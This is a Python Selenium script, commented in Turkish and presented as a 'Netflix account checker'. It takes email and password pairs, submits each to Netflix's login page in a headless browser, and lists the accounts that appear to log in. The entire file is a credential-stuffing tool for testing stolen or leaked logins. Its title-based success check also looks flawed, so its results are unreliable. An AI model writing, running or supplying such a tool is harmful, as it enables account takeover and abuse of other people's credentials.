import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from time import sleep

# 401 ASCII Sanatı (verdiğiniz tasarım)
ascii_art = """
 _    _      ____    __    
| |  | |   .'    '. /  |   
| |__| |_ |  .--.  |`| |   
|____   _|| |    | | | |   
    _| |_ |  `--'  |_| |_  
   |_____| '.____.'|_____| 
"""

# Hesapları kontrol etme fonksiyonu
def start_program(accounts):
    active_accounts = []

    # Chrome seçeneklerini ayarlıyoruz
    options = Options()
    options.add_argument("--headless")  # Tarayıcıyı başlatmadan işlemi yapar
    driver_path = "/path/to/your/chromedriver"  # Burada chromedriver yolunu belirtin
    driver = webdriver.Chrome(service=Service(driver_path), options=options)

    print("Tarama başlatıldı...")

    for account in accounts:
        email, password = account.split(',')
        try:
            # Netflix giriş sayfasını açıyoruz
            driver.get("https://www.netflix.com/login")
            sleep(2)

            # E-posta ve şifre alanlarını bulup dolduruyoruz
            email_field = driver.find_element(By.ID, "id_userLoginId")
            password_field = driver.find_element(By.ID, "id_password")

            email_field.send_keys(email)
            password_field.send_keys(password)
            password_field.send_keys(Keys.RETURN)

            sleep(5)

            # Giriş başarılıysa, ana sayfaya yönlendiriliriz. Başarısızsa, hata mesajı gelir.
            if "Netflix" in driver.title:
                active_accounts.append(email)
            else:
                print(f"Giriş başarısız: {email}")
        except Exception as e:
            print(f"Bir hata oluştu: {email} - {e}")

    driver.quit()

    # Tarama bittiğinde aktif hesapları gösterme
    print("\nTarama bitti!")
    print("Aktif Hesaplar:")
    if active_accounts:
        for acc in active_accounts:
            print(acc)
    else:
        print("Hiçbir aktif hesap bulunamadı.")

# Ana program
def main():
    print(ascii_art)  # ASCII sanatı yazdırılıyor
    print("Netflix Hesap Checker Tool")
    print("Hesap E-posta ve Şifrelerini (E-posta, Şifre şeklinde) girin, ardından 'Enter' tuşuna basın.")
    print("Hesapları bitirdiğinizde 'done' yazıp 'Enter' tuşuna basın.\n")

    accounts = []

    while True:
        account = input("Hesap bilgisi girin: ")
        
        if account.lower() == 'done':  # Kullanıcı 'done' yazarsa çıkılır
            break

        accounts.append(account)  # Girilen hesap bilgilerini listeye ekle

    # Hesapları kontrol etme işlemi
    start_program(accounts)

if __name__ == "__main__":
    main()
